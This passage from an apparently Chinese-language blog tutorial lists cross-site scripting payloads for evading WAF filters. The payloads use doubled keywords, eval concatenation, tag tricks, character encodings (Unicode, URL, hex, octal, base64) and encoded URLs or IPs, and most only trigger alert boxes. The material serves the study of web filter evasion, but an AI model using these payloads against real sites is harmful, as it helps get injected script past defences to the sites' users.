&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;ImG&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;sRc&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerRor&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;双写关键字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双写关键字&#34;&gt;#&lt;/a&gt; 双写关键字&lt;/h4&gt;
&lt;p&gt;有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;imimgg&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;srsrcc&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;字符拼接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字符拼接&#34;&gt;#&lt;/a&gt; 字符拼接&lt;/h4&gt;
&lt;h5 id=&#34;利用eval&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用eval&#34;&gt;#&lt;/a&gt; 利用 eval&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;a=`aler`;b=`t`;c=&amp;#x27;(`xss`);&amp;#x27;;eval(a+b+c)&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;利用top&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用top&#34;&gt;#&lt;/a&gt; 利用 top&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;top[&lt;span class=&#34;string&#34;&gt;&amp;quot;al&amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;ert&amp;quot;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;`xss`&lt;/span&gt;);&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;其它字符混淆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其它字符混淆&#34;&gt;#&lt;/a&gt; 其它字符混淆&lt;/h4&gt;
&lt;p&gt;有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了&lt;br&gt;
下面举几个简单的例子&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;可利用注释、标签的优先级等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1.&amp;lt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss&amp;quot;&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&amp;lt;/&lt;span class=&#34;attr&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(`xss`);&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;SCRIPT&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; a=&lt;span class=&#34;string&#34;&gt;&amp;quot;\\&amp;quot;&lt;/span&gt;;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss&amp;quot;&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;SCRIPT&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#编码绕过&#34;&gt;#&lt;/a&gt; 编码绕过&lt;/h4&gt;
&lt;h5 id=&#34;unicode编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unicode编码绕过&#34;&gt;#&lt;/a&gt; Unicode 编码绕过&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#97;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#108;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#101;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#114;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#116;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#40;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#34;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#120;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#115;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#115;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#34;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#41;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#59;&lt;/span&gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;eval(&amp;#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&amp;#x27;)&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;eval(unescape(&amp;#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&amp;#x27;))&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;ascii码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ascii码绕过&#34;&gt;#&lt;/a&gt; Ascii 码绕过&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;hex绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hex绕过&#34;&gt;#&lt;/a&gt; hex 绕过&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;eval(&lt;/span&gt;&amp;#x27;\&lt;span class=&#34;attr&#34;&gt;x61&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x6c&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x65&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x72&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x74&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x28&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x27&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x78&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x73&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x73&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x27&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;x29&lt;/span&gt;&amp;#x27;)&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;八进制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#八进制&#34;&gt;#&lt;/a&gt; 八进制&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;#x27;\&lt;span class=&#34;attr&#34;&gt;170&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;163&lt;/span&gt;\&lt;span class=&#34;attr&#34;&gt;163&lt;/span&gt;&amp;#x27;)&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;base64绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base64绕过&#34;&gt;#&lt;/a&gt; base64 绕过&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;eval(atob(&amp;#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&amp;#x27;))&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;3过滤引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3过滤引号&#34;&gt;#&lt;/a&gt; 3. 过滤引号&lt;/h3&gt;
&lt;p&gt;1. 如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;`&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;`);&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;2. 使用编码绕过，具体看上面我列举的例子&lt;/p&gt;
&lt;h3 id=&#34;4过滤括号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4过滤括号&#34;&gt;#&lt;/a&gt; 4. 过滤括号&lt;/h3&gt;
&lt;p&gt;使用 throw 绕过&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=&amp;quot;window.onerror=eval;throw&amp;#x27;=alert\x281\x29&amp;#x27;;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;5过滤url地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5过滤url地址&#34;&gt;#&lt;/a&gt; 5. 过滤 url 地址&lt;/h3&gt;
&lt;h4 id=&#34;使用url编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用url编码&#34;&gt;#&lt;/a&gt; 使用 url 编码&lt;/h4&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;document.location&lt;/span&gt;=`&lt;span class=&#34;attr&#34;&gt;http:&lt;/span&gt;//%&lt;span class=&#34;attr&#34;&gt;77&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;77&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;77&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;2e&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;62&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;61&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;69&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;64&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;75&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;2e&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;63&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;6f&lt;/span&gt;%&lt;span class=&#34;attr&#34;&gt;6d&lt;/span&gt;/`&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;使用ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用ip&#34;&gt;#&lt;/a&gt; 使用 IP&lt;/h4&gt;
&lt;p&gt;1. 十进制 IP&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;document.location&lt;/span&gt;=`&lt;span class=&#34;attr&#34;&gt;http:&lt;/span&gt;//&lt;span class=&#34;attr&#34;&gt;2130706433&lt;/span&gt;/`&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;2. 八进制 IP&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;document.location&lt;/span&gt;=`&lt;span class=&#34;attr&#34;&gt;http:&lt;/span&gt;//&lt;span 